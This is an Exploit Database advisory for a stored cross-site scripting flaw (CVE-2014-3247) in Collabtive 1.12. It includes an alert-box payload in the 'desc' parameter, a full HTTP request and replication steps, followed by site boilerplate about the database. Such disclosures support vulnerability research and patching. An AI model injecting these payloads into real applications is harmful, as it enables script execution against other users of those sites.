**Vulnerable App:**

```
Vulnerability title: Stored XSS vulnerability in Collabtive application
(CVE-2014-3247)
CVE: CVE-2014-3247(coordinated with cve assigning team and vendor)
Vendor: Collabtive
Product: Collabtive (Open Source Project Management Software)
Affected version: 1.12
Fixed version: 2.0
Reported by: Deepak Rathore
Severity: Critical
URL: http://[domain]/collabtive-12/admin.php?action=addpro
Affected Users: Authenticated users
Affected parameter(s): desc

Issue details: The value of the desc request parameter is copied into the
HTML document as plain text between tags. The payload 1c91c<img%20src%3da
%20onerror%3dalert(1) >cc245622da6 was submitted in the desc parameter.
This input was echoed as 1c91c<img src=a onerror=alert(1) >cc245622da6 in
the application's response.  This proof-of-concept attack demonstrates that
it is possible to inject arbitrary JavaScript into the application's
response. The proof-of-concept attack demonstrated uses an event handler to
introduce arbitrary JavaScript into the document.

HTTP request:
POST /collabtive-12/admin.php?action=addpro HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101
Firefox/28.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/collabtive-12/index.php?mode=login
Cookie: PHPSESSID=ri2sqmga763p7qav73enfv99p5
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
name=test&desc=test928a4<img%20src%3da%20onerror%3dalert(1)>a480a723950&neverdue=neverdue&budget=10&assignto%5B%5D=1&assignme=1

Steps to replicate:
1. Login into application
2. Go to "Desktop" tab and click on "Add project"
3. Fill the project details in the project form and click on "Add" button
4. Intercept request by interception proxy i.e. OWASP Zap, Burp Suite etc
5. Replace "desc" parameter value with "1c91c<img%20src%3da
%20onerror%3dalert(1) >cc245622da6"
6. Forward manipulated request to server and wait for response in browser
7. A popup with alert message will come that is the proof of vulnerability.

Tools used: Burp Suite proxy, Mozilla Firefox browser

Best Regards,
Deepak

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
